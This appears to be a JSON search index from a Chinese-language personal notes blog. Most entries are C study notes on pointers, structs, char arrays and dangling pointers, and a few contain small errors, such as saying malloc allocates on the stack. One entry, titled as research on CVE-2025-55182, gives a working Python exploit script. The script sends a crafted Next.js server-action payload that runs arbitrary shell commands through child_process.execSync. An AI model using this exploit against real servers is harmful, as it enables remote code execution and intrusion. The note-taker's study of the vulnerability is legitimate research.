[
{
		"title": "C 語言 pass by value",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/C 語言 pass by value/",
		"content": "C 語言沒有 pass by reference, 只有 pass by value，這是語言特性\n就算是 pointer 也是 pass by value\n若要實現 pass by reference, 需借助指針的功能\n#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid setNum(int *p)\n{\n*p = 10; // 解引用後修改其值\n}\nint main()\n{\nint a=100;\nprintf(&quot;a: %d\\n&quot;, a); // 100\nsetNum(&amp;a); // 將 a 的地址傳進 function\nprintf(&quot;a: %d\\n&quot;, a); // 10\n}",
		"tags": ["include", "include", "include", "note","C-lang"]
},

{
		"title": "malloc 內存分配 - void 指針",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/malloc 內存分配 - void 指針/",
		"content": "#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n// 無類型指針\n\n// 結構體指針\nint main()\n{\nint x = 10;\nint *p = &amp;x;\nprintf(&quot;%d\\n&quot;, *p);\n\n// 無類型的指針變數可以與其他類型的指針相賦值\nvoid *q = &amp;x; // 無類型指針\nq = p;\nint *r = q;\ndouble *s = q;\n\n// int y = *q; // 無法解讀 void 指針類型的數據\nint y = *((int *)q); // 強制轉型\nprintf(&quot;%d\\n&quot;, *r);\nprintf(&quot;%d\\n&quot;, y);\nprintf(&quot;%f\\n&quot;, *s); // 不要嘗試讀取其他類型的指針，會導致不可預期的行為\n}",
		"tags": ["include", "include", "include", "note","C-lang"]
},

{
		"title": "malloc 內存分配",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/malloc 內存分配/",
		"content": "malloc\n函數原型\nvoid *malloc(unsigned int size); // size 類型為無符號整型\n\n無符號整型 = 0 or 正整數\n因為少了負數，可以將所有位元用於顯示正整數\nmalloc 函數返回的是一個指針，所以他是一個指針函數\n作用: 在內存的動態儲存區(stack 區) 中分配一個長度為 size 的連續空間，並將該空間的首地址做為函數值返回，即此函數為指針函數",
		"tags": [ "note","C-lang"]
},

{
		"title": "二級指針(多重指針)",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/二級指針(多重指針)/",
		"content": "例題 1:\n// 野指針\n#include &lt;stdio.h&gt;\nint main(){\nint num = 10;\nint *p1 = &amp;num; // p1 指向 num 的地址\nint *p2 = p1; // p2 也指向 num 的地址（與 p1 相同）\nprintf(&quot;%p\\n&quot;, p1); // 輸出 p1（num 的地址）\nprintf(&quot;%p\\n&quot;, p2); // 輸出 p2（num 的地址，與 p1 相同）\n\n// 故，p2 不是二級指針，因為他還是指向 p1 的 num 地址\n\n// 記憶體示意圖\n// 記憶體地址 變數 值\n// 0x1000 num 10\n// 0x2000 p1 0x1000 (num的地址)\n// 0x3000 p2 0x1000 (複製p1的值，也是num的地址)\nreturn 0;\n}\n\n// execute:\n// clang PointerTest-4.c -o PointerTest-4 &amp;&amp; ./PointerTest-4\n\n例題 2:\n// 二重指針\n#include &lt;stdio.h&gt;\nint main(){\nint num = 10;\nint *p1 = &amp;num; // p1 指向 num 的地址\nint *p2 = p1; // p2 也指向 num 的地址（與 p1 相同）\nprintf(&quot;%p\\n&quot;, p1); // 輸出 p1（num 的地址）\nprintf(&quot;%p\\n&quot;, p2); // 輸出 p2（num 的地址，與 p1 相同）\n*p2 = 100; // 將 p2 所在的位址的值改為 100\nprintf(&quot;%d\\n&quot;, *p2); // 100\nprintf(&quot;num: %d\\n&quot;, num); // 因為 p2 取的是 num 的位址，當 *p2 賦值時，其實是修改 num 所在記憶體空間的值\nreturn 0;\n}\n\n// 二級指針\n#include &lt;stdio.h&gt;\nint main(){\nint a = 10;\nint *p3 = &amp;a;\n\n// 如何聲明二級指針\n// 但是此時 p4 定義的二級指針寫法錯誤\nint *p4 = &amp;p3;\nprintf(&quot;%p\\n&quot;, p3); // 0x16b74aadc\nprintf(&quot;%p\\n&quot;, &amp;p3); // 0x16b74aad0\nprintf(&quot;%p\\n&quot;, p4); // 0x16b74aad0\nprintf(&quot;%p\\n&quot;, &amp;p4); // 0x16f05eac8(p4 的地址)\n\n// 正確的定義二級指針語法\nint **p5 = &amp;p3;\nprintf(&quot;%d\\n&quot;, *p5); // 1868049116\nprintf(&quot;%d\\n&quot;, **p5); // 10(正確， **p5 = p3 指針所指向的 a 的值)\n\n**p5 = 100;\nprintf(&quot;%d\\n&quot;, **p5); // 10(正確， **p5 = p3 指針所指向的 a 的值)\nprintf(&quot;%d\\n&quot;, a); // 10(正確，**p5 = p3 指針所指向的 a 的值)\n}\n\n// execute:\n// clang PointerTest-4.c -o PointerTest-4 &amp;&amp; ./PointerTest-4\n\n二級指針只能由指針賦值，不能直接拿地址賦值\n// 舉例 1:\nint b = 5;\nint **p1 = &amp;b; // 這裡出錯，因為 b 是 int 類型，就算 &amp;b 也是取 int 的地址，但 **p1 是二級指針\n\n// 正確\nint b = 5;\nint *pp0 = &amp;b; // 需要經過一個轉換，轉換成指針形態才能賦值給二級指針\nint **p1 = &amp;pp0;\nprintf(&quot;%d\\n&quot;, **p1);\n\n多級指針解引用\n\n// 二級指針 -&gt; 多級指針\n#include &lt;stdio.h&gt;\nint main(){\nint var = 5;\nint *ptr = &amp;var;\nprintf(&quot;%d\\n&quot;, *ptr);\nint **pptr = &amp;ptr; // 二級指針\nprintf(&quot;%d\\n&quot;, **pptr);\nint ***ppptr = &amp;pptr; // 三級指針\nprintf(&quot;%d\\n&quot;, ***ppptr); // 三級指針解引用\n\n***ppptr = 100; // 其實修改的是 var 的變數值\n// 所有引用這個地址的值都被修改了\nprintf(&quot;%d\\n&quot;, *ptr);\nprintf(&quot;%d\\n&quot;, **pptr);\nprintf(&quot;%d\\n&quot;, ***ppptr);\n\n}\n\n// execute:\n// clang PointerTest-4.c -o PointerTest-4 &amp;&amp; ./PointerTest-4",
		"tags": ["include", "include", "include", "include", "note","C-lang"]
},

{
		"title": "同類指針相減運算",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/同類指針相減運算/",
		"content": "#include &lt;stdio.h&gt;\nint main(){\nint arr[5] = {1, 3, 5, 7, 9};\n\n// 使用 &amp; 運算符，提取 arr[0] 的地址存入指針變數 p1\nint *p1 = &amp;arr[0];\nint *p2 = &amp;arr[3];\nprintf(&quot;%d\\n&quot;, *p1); // 1\nprintf(&quot;%d\\n&quot;, *p2); // 7\nprintf(&quot;%d\\n&quot;, *p2-*p1); // 用 * 運算符取 p2、p1 指針值做相減(7-1=6)\nprintf(&quot;%d\\n&quot;, p1); // 指針相減 p2-p1 相差 14\nprintf(&quot;%d\\n&quot;, p2); // 指針相減 p2-p1 相差 14\nprintf(&quot;%d\\n&quot;, p2 - p1); // 指針相減 p2-p1 相差 12 個 byte (1807002288-1807002300 = 12)/4bit(int 長度) = 3 個元素的距離\nreturn 0;\n}\n\n// execute: clang PointerTest-2.3.3.c -o PointerTest-2.3.3 &amp;&amp; ./PointerTest-2.3.3\n\n&amp; 與 * 差異\n&amp; -&gt; 從「變數」取址運算符\n* -&gt; 從「指針」取值運算符\n\nAB 兩個選想是因為 scanf 需要以 &amp; 作為賦值\n賦值練習題",
		"tags": ["include", "note","C-lang"]
},

{
		"title": "字符數組",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/字符數組/",
		"content": "#include &lt;stdio.h&gt;\n\nint main()\n{\n/*\nC 語言裡面沒有 string 的型別，需要以 char array 的方式實現\n所有字符數組必須以 \\0 作為結尾\n且字符串末尾的 \\0 會佔一個 bytes，計算 length 需注意 n(字符串數量) + 1\n*/\n//字符數組必須以 \\0 作為結尾\nchar arr[] = {'a', 'b', 'c', 'd', '\\0'};\n\n// 標準寫法\nchar str1[] = {'h', 'e', 'l', 'l', 'o', 'w', '\\0'};\n\n// 簡化\n// length = string 數量(11) + '\\0'(1) 的數量共 12 個\nchar str2[12] = {&quot;hello world&quot;}; // 注意使用雙引號，非單引號\n\n// 進一步簡化\nchar str3[] = {&quot;hello world&quot;};\nchar str4[] = &quot;hello world&quot;;\n\nsize_t str_size = sizeof(str4) / sizeof(char);\nprintf(&quot;%d\\n&quot;, str_size); // 字符串長度 12\n}\n\n區分: '\\0', 0, '0'\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\n// 區分: '\\0', 0, '0'\nprintf(&quot;%d\\n&quot;, '\\0' == 0); // true\nprintf(&quot;%d\\n&quot;, '0' == '\\0'); // false\nprintf(&quot;%d\\n&quot;, '0' == 0); // false\n}\n\n單雙引號區別\n如果用 &quot;x&quot; 宣告字符串變數，C 語言就會自動補 \\0\n如果用 'x' 宣告字符串變數，C 語言不會自動補 \\0，但用 'x' 宣告的字符串可以進行ASCII加減法\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\nchar char1[] = &quot;x&quot;; // 常量，會自動補 \\0 結束符\nchar char2[] = {'x'}; // 字符，必須手動補 \\0 結束符\n// &quot;x&quot; 與 'x' 字節佔用量\nprintf(&quot;%d\\n&quot;, (sizeof(char1) / sizeof(char))); // 2，含結束符 \\0\nprintf(&quot;%d\\n&quot;, (sizeof(char2) / sizeof(char))); // 1，不含結束符 \\0\n}\n\nchar 字符 ASCII 運算\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\nchar char1[] = &quot;x&quot;; // 常量，會自動補 \\0 結束符\nchar char2[] = {'x'}; // 字符，必須手動補 \\0 結束符\n// &quot;x&quot; 與 'x' 字節佔用量\nprintf(&quot;%d\\n&quot;, (sizeof(char1) / sizeof(char))); // 2，含結束符 \\0\nprintf(&quot;%d\\n&quot;, (sizeof(char2) / sizeof(char))); // 1，不含結束符 \\0\n\n// %c 用於輸出一個 char 字符\nprintf(&quot;%c\\n&quot;, 'x'+1); // char 運算，+1 後會變成 y\nprintf(&quot;%c\\n&quot;, 65); // 輸出 A, 因為(ASCII 65 = 'A')\nprintf(&quot;%c\\n&quot;, 'A'+1); // 輸出 B, 因為(ASCII 65 = 'A')+1 = (ASCII 66 = 'B')\n}",
		"tags": ["include", "include", "include", "include", "include", "include", "include", "note","C-lang"]
},

{
		"title": "指針的自增自減運算",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/指針的自增自減運算/",
		"content": "#include &lt;stdio.h&gt;\nint main(){\nint arr[5] = {1, 2, 3, 4, 5};\n\n// 以下兩種寫法相等\n// int *p = arr; // 取 arr 首地址存入 pointer p\nint *p = &amp;arr[0]; // &amp; 取地址，並賦值到 *p\np++; // 使 p 指向下一個元素\nprintf(&quot;%d\\n&quot;, *p);\nreturn 0;\n}\n\n運算子結合是由右往左結合\n#include &lt;stdio.h&gt;\nint main(){\nint arr[5] = {1, 3, 5, 7, 9};\n\n// 以下兩種寫法相等\n// int *p = arr; // 取 arr 首地址存入 pointer p\nint *p = &amp;arr[0]; // &amp; 取地址，並賦值到 *p -&gt; 1\np++; // 使 p 指向下一個元素 -&gt; 3\nprintf(&quot;%d\\n&quot;, *p); // 3\nprintf(&quot;%d\\n&quot;, *p++); //取值後輸出，並往後移動 4 個 bit -&gt; 3\nprintf(&quot;%d\\n&quot;, *p); // 重新取用一次 p 的值 -&gt; 5\n// *++p 運算子是由右往左結合，故等同於 *(++p)\n// ++p 為 7，*++p = 取 p 值 = 7\nprintf(&quot;%d\\n&quot;, *++p); // 再移動指針增加 4 bit, 並取值 p -&gt; 7\n// ++*p = ++(*p) 取 *p 值並 +1(由右往左結合)\nprintf(&quot;%d\\n&quot;, ++*p); // 取指針 p 的值(7)，並將該值 + 1 -&gt; 8\n\nreturn 0;\n}",
		"tags": ["include", "include", "note","C-lang"]
},

{
		"title": "數組反轉操作",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/數組反轉操作/",
		"content": "#include &lt;stdio.h&gt;\n\nint main()\n{\n// 一維數組反轉操作\nint arr[] = {0,1,2,3,4,5,6,7,8,9};\nsize_t LENGTH = sizeof(arr) / sizeof(int);\nint tmp = 0;\n// for (int i=0; i &lt; (LENGTH/2); i++)\n// {\n// tmp = arr[i];\n// arr[i] = arr[LENGTH-1-i];\n// arr[LENGTH-1-i] = tmp;\n// }\n\n// 反轉實現方式 2\nfor (int left = 0, right = LENGTH-1;left &lt; right;left++, right--)\n{\nint tmp = arr[left];\narr[left] = arr[right];\narr[right] = tmp;\n}\nfor (int i=0; i &lt; LENGTH; i++)\n{\nprintf(&quot;--%d\\n&quot;, arr[i]);\n}\n\n}",
		"tags": ["include", "note","C-lang"]
},

{
		"title": "結構體指針傳遞練習題 1",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/結構體指針傳遞練習題 1/",
		"content": "#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n/*結構體傳參*/\n// 聲明一個結構體\nstruct Dog\n{\nchar name[20];\nint age;\ndouble weight;\n};\n\n// 只能在這邊聲明返回指針\n// 陣列在表達式中會自動轉換為指針\nchar *say(struct Dog dog){\nstatic char info[100]; // 需要將局部變量，宣告為 static, 確保在 say 函數運行後，不會銷毀\nsprintf(info, &quot;Name: %s, Age: %d, Weight: %.2lf&quot;, dog.name, dog.age, dog.weight);\nreturn info; //實際是返回陣列的[0] 位置的指針\n}\n\n// 方式 2, 指針傳遞\nchar *say1(struct Dog *dog_ptr){\nstatic char info[100]; // 需要將局部變量，宣告為 static, 確保在 say 函數運行後，不會銷毀\n(*dog_ptr).age = (*dog_ptr).age + 1;\nsprintf(info, &quot;Name: %s, Age: %d, Weight: %.2lf&quot;, (*dog_ptr).name, (*dog_ptr).age, (*dog_ptr).weight);\nreturn info; //實際是返回陣列的[0] 位置的指針\n}\n\n// 結構體指針\nint main()\n{\n// 聲明結構體變量，並初始化\nstruct Dog myDog;\nstrcpy(myDog.name, &quot;大黃&quot;);\nmyDog.age = 2;\nmyDog.weight = 2.3;\n\nchar *result = say(myDog);\nprintf(&quot;info=%s\\n&quot;, result);\n\nchar *result2 = say1(&amp;myDog);\nprintf(&quot;info=%s\\n&quot;, result2);\nreturn 0;\n}",
		"tags": ["include", "include", "note","C-lang"]
},

{
		"title": "結構體指針變數使用",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/結構體指針變數使用/",
		"content": "#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n\n// 聲明一個結構體\nstruct Person\n{\nchar name[20];\nint age;\n};\n\n// 結構體指針\nint main()\n{\nstruct Person per1 = {.name=&quot;Tom&quot;, .age=12};\nstruct Person *per_ptr = &amp;per1;\n\n// 兩者等價\n(*per_ptr).age = 20;\nper_ptr-&gt;age = 30;\n\nprintf(&quot;name: %s\\n&quot;, (*per_ptr).name);\nprintf(&quot;age: %d\\n&quot;, (*per_ptr).age);\n\n}",
		"tags": ["include", "include", "note","C-lang"]
},

{
		"title": "結構體指針變數傳遞",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/結構體指針變數傳遞/",
		"content": "#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n/*結構體傳參*/\n// 聲明一個結構體\nstruct Person\n{\nchar name[20];\nint age;\n};\n\nvoid addAge(struct Person per){\n// 實際傳入的是結構體的副本\nper.age = per.age + 1;\n}\nvoid addAge1(struct Person *per){\n// 修改的是指針裡面的值\nper-&gt;age = per-&gt;age + 1;\n}\n\n// 結構體指針\nint main()\n{\nstruct Person per1 = {.name=&quot;Tom&quot;, .age=13};\n// 實際傳入的是結構體的副本，pass by value\naddAge(per1);\nprintf(&quot;name: %s\\n&quot;, per1.name);\nprintf(&quot;age: %d\\n&quot;, per1.age);\n\n// 傳入結構體的指針，pass by reference\naddAge1(&amp;per1);\nprintf(&quot;name: %s\\n&quot;, per1.name);\nprintf(&quot;age: %d\\n&quot;, per1.age);\n}",
		"tags": ["include", "include", "note","C-lang"]
},

{
		"title": "結構體數組訪問",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/結構體數組訪問/",
		"content": "#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n\nstruct Person\n{\nchar name[20];\nint age;\n};\n\nint main()\n{\n// 1. 創建結構體數組\nstruct Person p_arr[5];\n\n// 2. 如何給結構體數組的元素賦值\nstrcpy(p_arr[0].name, &quot;Jason&quot;);\np_arr[0].age = 5;\nstrcpy(p_arr[1].name, &quot;Jason111&quot;);\np_arr[0].age = 6;\nstrcpy(p_arr[2].name, &quot;Jason222&quot;);\np_arr[0].age = 7;\n//3. 如何調用數組的元素，即結構體內部的成員\n\nprintf(&quot;p_arr[0].name: %s\\n&quot;, p_arr[0].name);\nprintf(&quot;p_arr[1].name: %s\\n&quot;, p_arr[1].name);\nprintf(&quot;p_arr[2].name: %s\\n&quot;, p_arr[2].name);\n\n/*聲明方式 2*/\n// 1. 創建結構體數組\nstruct Person p_arr2[]={ {.name=&quot;John&quot;, .age=1},\n{.name=&quot;John1&quot;, .age=2},\n{.name=&quot;Joh2&quot;, .age=3}};\n\nprintf(&quot;p_arr2[0].name: %s\\n&quot;, p_arr2[0].name);\nprintf(&quot;p_arr2[1].name: %s\\n&quot;, p_arr2[1].name);\nprintf(&quot;p_arr2[2].name: %s\\n&quot;, p_arr2[2].name);\n\n/*使用指向數組的指針*/\nstruct Person *ptrPerson;\n\n// 取得第 0 個結構體的指針參考\nptrPerson = &amp;p_arr[0];\nprintf(&quot;ptrPerson.name: %s\\n&quot;, ptrPerson-&gt;name);\n}",
		"tags": ["include", "include", "note","C-lang"]
},

{
		"title": "結構體複製 - pass by value",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/結構體複製 - pass by value/",
		"content": "#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n\nstruct Car\n{\nchar name[30];\ndouble price;\n} a = {.name=&quot;audi AAA&quot;, .price=100};\n\nint main()\n{\n// 複製行為\nstruct Car b = a; // 結構體複製是 pass by value\nprintf(&quot;a: %p\\n&quot;, &amp;a);\nprintf(&quot;b: %p\\n&quot;, &amp;b); // 地址不同\n\nprintf(&quot;a =&gt; name: %s, price: %f\\n&quot;, a.name, a.price); // 值是一樣\nprintf(&quot;b =&gt; name: %s, price: %f\\n&quot;, b.name, b.price); // 值是一樣\n\n}\n\n結構體的複製是 pass by value\n\nprintf(&quot;%p\\n&quot;, &amp;a.name) 輸出的是自己的變數地址\nprintf(&quot;%p\\n&quot;, a.name) 輸出指針變數指向的變數地址\n在 C 語言中，字符串屬於常量，只要定義一個字符串 &quot;Hello&quot;, 不管後續誰指向，都是指到同個記憶體位置\n#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n\nstruct Car\n{\nchar *name;\ndouble price;\n} a = {.name=&quot;audi AAA&quot;, .price=100};\n\nint main()\n{\n// 複製行為\nstruct Car b = a; // 結構體複製是 pass by value，會產生新地址\nprintf(&quot;a: %p\\n&quot;, &amp;a);\nprintf(&quot;b: %p\\n&quot;, &amp;b); // 地址不同\n\n/*\n結構體本身複製的是值，當值是指針變數時，複製的是該指針變數指向的地址\n*/\nprintf(&quot;a =&gt; name: %p, price: %p\\n&quot;, &amp;a.name, &amp;a.price); // &amp;a.name 顯示指針變數的地址 a =&gt; name: 0x102480000, price: 0x102480008\nprintf(&quot;b =&gt; name: %p, price: %p\\n&quot;, &amp;b.name, &amp;b.price); // &amp;b.name 顯示指針變數的地址 b =&gt; name: 0x16d986a10, price: 0x16d986a18\nprintf(&quot;a =&gt; name: %p, price: %f\\n&quot;, a.name, a.price); // a.name 指向的變數地址 a =&gt; name: 0x102478600, price: 100.000000\nprintf(&quot;b =&gt; name: %p, price: %f\\n&quot;, b.name, b.price); // b.name 指向的變數地址 b =&gt; name: 0x102478600, price: 100.000000\n\n}",
		"tags": ["include", "include", "include", "include", "note","C-lang"]
},

{
		"title": "結構體訪問 - 課後練習",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/結構體訪問 - 課後練習/",
		"content": "題目:\n輸入班級所有學生的成績，輸出成績高於平均的學生姓名與分數\n#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#define LENGTH 4\n// 需求: 輸入班級學生訊息\nstruct Student\n{\nint id;\nchar name[20];\nchar gender;\nint score;\n};\n\nint main()\n{\n// 聲明學生的結構體數組\nstruct Student student_arr[LENGTH] = {{.id=1, .name=&quot;alice&quot;, .gender='M', .score=60},\n{.id=2, .name=&quot;bob&quot;, .gender='F', .score=65},\n{.id=3, .name=&quot;hoho&quot;, .gender='F', .score=70},\n{.id=4, .name=&quot;doe&quot;, .gender='M', .score=80}};\nint score_sum = 0;\nfor (int i = 0; i &lt; LENGTH; i++){\nprintf(&quot;score: %d\\n&quot;, student_arr[i].score);\nscore_sum += student_arr[i].score;\n}\nint avg_score = score_sum/LENGTH;\nprintf(&quot;avg_score: %d\\n&quot;, avg_score);\nfor (int i = 0; i &lt; LENGTH; i++){\nif (student_arr[i].score &gt; avg_score){\nprintf(&quot;name: %s, score: %d\\n&quot;, student_arr[i].name, student_arr[i].score);\n}\n}\n}\n\noutput:\n\tscore: 60\n\tscore: 65\n\tscore: 70\n\tscore: 80\n\tavg_score: 68\n\tname: hoho, score: 70\n\tname: doe, score: 80",
		"tags": ["include", "include", "define", "note","C-lang"]
},

{
		"title": "聲明結構體練習",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/聲明結構體練習/",
		"content": "#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n/*結構體傳參*/\n// 聲明一個結構體\nstruct Node\n{\nint data;\nstruct Node *next; // 指向 Node 型變數的指針\n};\n\n// 或是如下定義\ntypedef struct Node1\n{\nint data;\nstruct Node *next;\n}LNode;\n\n// 聲明二叉樹的節點\n// 方式 1\nstruct BTNode\n{\nint data;\nstruct BTNode *lchild; // 指向左子樹\nstruct BTNode *rchild; // 指向右子樹\n\n};\n\n// 方式 2\ntypedef struct BTNode1\n{\nint data;\nstruct BTNode1 *lchild; // 指向左子樹\nstruct BTNode1 *rchild; // 指向右子樹\n\n}BTNode1;\n\n// 結構體指針\nint main()\n{\n// 聲明節點變量的不同方式\n// 方式 1:\n// 聲明單向鍊表的節點\nstruct Node node1;\nLNode node2;\n\n// 聲明二叉樹的節點\nstruct BTNode btnode1;\nBTNode1 btnode2;\n\n// 方式 2:\nBTNode1 *node5;\n\n// 動態開闢 BTNode1 大小的空間\n// (BTNode1 *) 強制轉型為 BTNode1 類型\nnode5 = (BTNode1 *)malloc(sizeof(BTNode1));\nfree(node5); // 釋放 node5 空間\nreturn 0;\n}",
		"tags": ["include", "include", "include", "note","C-lang"]
},

{
		"title": "野指針",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/野指針/",
		"content": "// 野指針\n#include &lt;stdio.h&gt;\nint main(){\nint *p;\nprintf(&quot;%p\\n&quot;, &amp;p);\nreturn 0;\n}\n\n// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;&amp; ./PointerTest-3.2\n\n修改未初始化的指針變數的值\n// 野指針\n#include &lt;stdio.h&gt;\nint main(){\nint *p;\n*p = 10; // 在沒有初始化指針變數的情況下，修改指針變數的值是錯誤的\nprintf(&quot;%p\\n&quot;, &amp;p); // 引發: Bus error: 10\nreturn 0;\n}\n\n// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;&amp; ./PointerTest-3.2\n\n// 野指針\n#include &lt;stdio.h&gt;\nint main(){\nint num = 11;\nint *p;\n*p = num; // 在沒有初始化指針變數的情況下，修改指針變數的值是錯誤的\nprintf(&quot;%p\\n&quot;, &amp;p); // 引發: Bus error: 10\nprintf(&quot;%d\\n&quot;, *p);\nreturn 0;\n}\n\n// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;&amp; ./PointerTest-3.2\n\nBus error: 10\n是在 Unix-like 系統（像 macOS、Linux） 上常見的錯誤訊息。代表程式嘗試存取 無效的記憶體位址 或 不符合對齊規則的記憶體位址。\n在 macOS 上特別常見，因為它的記憶體對齊要求比較嚴格。\n原因\n\n指標錯誤使用\n\n指標指向無效的記憶體位置（例如已經 free 過，或是從未正確初始化）。\n指標運算錯誤，導致存取到錯誤位置。\n\n指針越界訪問\n\n// 野指針\n#include &lt;stdio.h&gt;\nint main(){\nint arr[5] = {1, 3, 5, 7, 9};\nprintf(&quot;%d\\n&quot;, arr[1]); // 3\nprintf(&quot;%p\\n&quot;, &amp;arr[1]); // 0x16bc9eab4\nprintf(&quot;%d\\n&quot;, arr[2]); // 5\nprintf(&quot;%p\\n&quot;, &amp;arr[2]); // 0x16bc9eab8\nprintf(&quot;%d\\n&quot;, arr[99]); // 0 &lt;- 野指針，無法預測這裡的值\nprintf(&quot;%p\\n&quot;, &amp;arr[99]); // 0x16bc9ec3c &lt;- 野指針地址，無法預測這裡的值\n}\n\n// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;&amp; ./PointerTest-3.2\n\n野指針 2:\n以 for loop 方式越界訪問\n// 野指針\n#include &lt;stdio.h&gt;\nint main(){\nint arr[5] = {1, 3, 5, 7, 9};\nfor (int i = 0; i &lt; 10; i++){\nprintf(&quot;index: %d, value: %d\\n&quot;, i, arr[i]);\n}\n}\n\n// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;&amp; ./PointerTest-3.2\n\n/*\noutput:\nindex: 0, value: 1\nindex: 1, value: 3\nindex: 2, value: 5\nindex: 3, value: 7\nindex: 4, value: 9\nindex: 5, value: 1\nindex: 6, value: -1657536328\nindex: 7, value: -1157789503\nindex: 8, value: 1836167456\nindex: 9, value: 1\n*/\n\n// 野指針\n#include &lt;stdio.h&gt;\nint main(){\nint arr[5] = {1, 3, 5, 7, 9};\nint *p = arr; // 賦值 &amp;arr[0]\nfor (int i = 0; i &lt; 10; i++){\nprintf(&quot;%d\\n&quot;, *p++); // 地址先 +1 個 int 單位(4 個 bytes = 32 bits)\n}\n}\n\n// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;&amp; ./PointerTest-3.2\n/*\noutput:\n1\n3\n5\n7\n9\n1\n525336608\n-509251205\n1865920800\n1\n*/\n\n訪問已回收的地址\n// 野指針\n#include &lt;stdio.h&gt;\nint *test(){\nint a = 15; // 局部變數\n// 返回變數 a 的地址\nreturn &amp;a;\n}\n\nvoid dummy_function(){\nint x = 999, y = 888, z = 777; // 故意覆蓋 stack\nprintf(&quot;dummy function called\\n&quot;);\n}\n\nint main(){\n\t// 因為 p2 指向一個可能會被回收掉的地址，所以就產生一個野指針\nint *p2 = test();\nprintf(&quot;第一次讀取: %d\\n&quot;, *p2);\n\ndummy_function(); // 覆蓋 stack\n\nprintf(&quot;第二次讀取: %d\\n&quot;, *p2); // 讀到垃圾值\nreturn 0;\n}\n\n// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;&amp; ./PointerTest-3.2\n\n/*\noutput:\n\t第一次讀取: 15\n\tdummy function called\n\t第二次讀取: 1\n*/\n\n避免野指針",
		"tags": ["include", "include", "include", "include", "include", "include", "include", "note","C-lang"]
},

{
		"title": "CVE-2025-55182 漏洞研究",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/CVE-2025-55182 漏洞研究/",
		"content": "npm create next-app@16.0.6\n\ncd my-app/\nnpm run dev\n\n打開 http://localhost:3000\n攻擊程式\n# refrence: https://github.com/msanft/CVE-2025-55182\n\nimport requests\nimport sys\nimport json\n\nBASE_URL = sys.argv[1] if len(sys.argv) &gt; 1 else &quot;http://localhost:3000&quot;\nEXECUTABLE = sys.argv[2] if len(sys.argv) &gt; 2 else &quot;id&quot;\n\ncrafted_chunk = {\n&quot;then&quot;: &quot;$1:__proto__:then&quot;,\n&quot;status&quot;: &quot;resolved_model&quot;,\n&quot;reason&quot;: -1,\n&quot;value&quot;: '{&quot;then&quot;: &quot;$B0&quot;}',\n&quot;_response&quot;: {\n&quot;_prefix&quot;: f&quot;var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});&quot;,\n# If you don't need the command output, you can use this line instead:\n# &quot;_prefix&quot;: f&quot;process.mainModule.require('child_process').execSync('{EXECUTABLE}');&quot;,\n&quot;_formData&quot;: {\n&quot;get&quot;: &quot;$1:constructor:constructor&quot;,\n},\n},\n}\n\nfiles = {\n&quot;0&quot;: (None, json.dumps(crafted_chunk)),\n&quot;1&quot;: (None, '&quot;$@0&quot;'),\n}\n\nheaders = {&quot;Next-Action&quot;: &quot;x&quot;}\nres = requests.post(BASE_URL, files=files, headers=headers, timeout=10)\nprint(res.status_code)\nprint(res.text)",
		"tags": [ "note","CVE"]
},

{
		"title": "Docker overlay2 儲存結構研究",
